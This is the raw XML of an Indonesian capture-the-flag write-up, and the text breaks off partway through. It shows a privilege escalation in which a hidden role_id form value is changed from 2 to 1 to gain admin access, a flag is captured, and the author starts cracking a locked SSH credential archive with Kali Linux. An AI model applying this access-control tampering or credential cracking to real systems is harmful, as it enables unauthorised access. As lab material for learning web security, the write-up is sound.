      <w:r w:rsidR="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">low user </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tidak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00217A09">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mendapatkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00217A09">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00217A09">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00217A09">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00217A09">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>akses</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00217A09">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> super user/root</w:t>
      </w:r>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>karna</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>memungkinkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D41E98">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009E103D">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">user </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009E103D">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mengganti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009E103D">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> role</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346F791B" w14:textId="303AF20D" w:rsidR="00192BD3" w:rsidRDefault="006912F2" w:rsidP="00AD5F3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12184A4" w14:textId="06FD8026" w:rsidR="00096823" w:rsidRDefault="00096823" w:rsidP="005974AE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profile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 w:rsidR="00EF09C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inspect pada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password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFA116C" w14:textId="1D14BA4E" w:rsidR="00EF3EA2" w:rsidRDefault="00EF3EA2" w:rsidP="001A5E11">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF3EA2">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F3C0C98" wp14:editId="3147A982">
            <wp:extent cx="4315377" cy="2154555"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="207289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6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842" cy="21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CDA7" w14:textId="57340F19" w:rsidR="001A5E11" w:rsidRDefault="005974AE" w:rsidP="001A5E11">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001A5E11">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Setelah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itu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masuk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ke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bagian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role_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001A5E11">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001A5E11">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001A5E11">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> di</w:t>
      </w:r>
      <w:r w:rsidR="001723BE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB2912" w:rsidRPr="00347C03">
        <w:rPr>
          <w:rStyle w:val="webkit-html-attribute-name"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidR="00DB2912" w:rsidRPr="00347C03">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:r w:rsidR="00B21939">
        <w:rPr>
          <w:rStyle w:val="webkit-html-attribute-value"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00DB2912" w:rsidRPr="00347C03">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379B0D99" w14:textId="1BE5566F" w:rsidR="00B21939" w:rsidRPr="00B21939" w:rsidRDefault="00B21939" w:rsidP="00B21939">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Lalu </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ganti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:rStyle w:val="webkit-html-attribute-name"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E3E3E3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E3E3E3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:rStyle w:val="webkit-html-attribute-value"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E3E3E3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B21939">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E3E3E3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1368D409" w14:textId="77777777" w:rsidR="00B21939" w:rsidRDefault="00B21939" w:rsidP="001A5E11">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E1D685E" w14:textId="23C40B07" w:rsidR="00BD5352" w:rsidRDefault="00BD5352" w:rsidP="00BD5352">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13A14D41" wp14:editId="6F58EE10">
            <wp:extent cx="6234623" cy="3339356"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="157934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83" cy="33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4676" w14:textId="77777777" w:rsidR="00CF54B0" w:rsidRPr="00CF54B0" w:rsidRDefault="00CF54B0" w:rsidP="00CF54B0"/>
    <w:p w14:paraId="675800A0" w14:textId="1386479C" w:rsidR="00CF54B0" w:rsidRPr="00723126" w:rsidRDefault="00723126" w:rsidP="00764298">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00723126">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Lalu update profile</w:t>
      </w:r>
      <w:r w:rsidR="00E6511A">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E6511A">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>halaman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E6511A">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> login admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1350B164" w14:textId="7C19A852" w:rsidR="00CF54B0" w:rsidRDefault="00764298" w:rsidP="00764298">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00764298">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F5B4314" wp14:editId="15C999FD">
            <wp:extent cx="6074797" cy="2456690"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1270"/>
            <wp:docPr id="6079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1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550" cy="24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E95A" w14:textId="52BFE15F" w:rsidR="00764298" w:rsidRPr="007C113C" w:rsidRDefault="007C113C" w:rsidP="00AB336D">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C113C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Klik</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007C113C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AB336D">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pada menu Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C756363" w14:textId="4C035702" w:rsidR="00615EF6" w:rsidRDefault="00615EF6" w:rsidP="00615EF6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7542BDB9" wp14:editId="72254A6F">
            <wp:extent cx="6114553" cy="2893695"/>
            <wp:effectExtent l="0" t="0" r="635" b="1905"/>
            <wp:docPr id="1087239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36" cy="291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6C06" w14:textId="77777777" w:rsidR="00B21DB3" w:rsidRDefault="00B21DB3" w:rsidP="00615EF6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18870D4F" w14:textId="0F2947AF" w:rsidR="00BC3911" w:rsidRDefault="0018307C" w:rsidP="00F06D40">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21DB3">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B21DB3">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> flag pada </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21DB3">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>halaman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B21DB3">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> admin </w:t>
      </w:r>
      <w:r w:rsidR="00B21DB3" w:rsidRPr="00B21DB3">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>di menu Files</w:t>
      </w:r>
      <w:r w:rsidR="00F06D40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C5F619" w14:textId="4845C5D4" w:rsidR="00CF54B0" w:rsidRPr="000D20B1" w:rsidRDefault="00F06D40" w:rsidP="00F06D40">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D20B1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000D20B1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Previlage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000D20B1" w:rsidRPr="000D20B1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> Escalation</w:t>
      </w:r>
      <w:r w:rsidR="00C645F3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="008041C0">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="00C645F3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">roken </w:t>
      </w:r>
      <w:r w:rsidR="008041C0">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00C645F3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>ccess</w:t>
      </w:r>
      <w:r w:rsidR="00BC3911">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008041C0">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00C645F3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>ontrol</w:t>
      </w:r>
      <w:r w:rsidR="000D20B1" w:rsidRPr="000D20B1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00DB79CC">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> FLAG:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3A03C4" w14:textId="77777777" w:rsidR="00CF54B0" w:rsidRDefault="00CF54B0" w:rsidP="00CF54B0"/>
    <w:p w14:paraId="4F890917" w14:textId="3D914C24" w:rsidR="00CF54B0" w:rsidRDefault="00D466C8" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D466C8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>FLAG{0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D466C8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>xPr!vilege</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D466C8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>3scalation_BAC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B47F245" w14:textId="77777777" w:rsidR="00444B9C" w:rsidRDefault="00444B9C" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77630D76" w14:textId="6D839069" w:rsidR="00DB79CC" w:rsidRDefault="007A61D9" w:rsidP="00CF54B0">
      <w:pPr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file credential.zip </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E71E2">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E71E2">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSH </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000D2919">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kedalam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000D2919">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> server </w:t>
      </w:r>
      <w:r w:rsidR="00E50150">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dengan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keadaan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00014CF6">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00436C42">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>terkunci</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1926955A" w14:textId="14698E42" w:rsidR="006C60E5" w:rsidRPr="00DB79CC" w:rsidRDefault="006C60E5" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C60E5">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30833818" wp14:editId="038F30D2">
            <wp:extent cx="5820355" cy="2583815"/>
            <wp:effectExtent l="0" t="0" r="9525" b="6985"/>
            <wp:docPr id="29562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29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42" cy="25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AEB9" w14:textId="27D2EAFE" w:rsidR="00764298" w:rsidRDefault="00E036CA" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Selanjutnya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>akan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>membypass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E036CA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>filenya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B55058">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan </w:t>
      </w:r>
      <w:r w:rsidR="00A06B25">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">kali </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A06B25">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
